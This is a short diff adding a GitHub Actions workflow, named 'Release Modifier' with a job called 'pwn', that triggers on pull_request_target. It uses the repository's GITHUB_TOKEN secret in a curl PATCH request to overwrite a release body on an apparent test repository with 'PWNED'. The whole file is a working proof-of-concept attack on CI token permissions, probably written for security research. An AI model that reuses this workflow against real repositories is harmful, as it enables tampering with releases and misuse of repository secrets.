@@ -1,0 +1,9 @@
+name: Release Modifier
+on:
+  pull_request_target:
+jobs:
+  pwn:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          curl -X PATCH -H \"Authorization: token \${{ secrets.GITHUB_TOKEN }}\" \n            -H \"Accept: application/vnd.github+json\" \n            https://api.github.com/repos/zpqrtbnk/test-repo/releases/85128600 \n            -d '{\"body\":\"PWNED\"}'
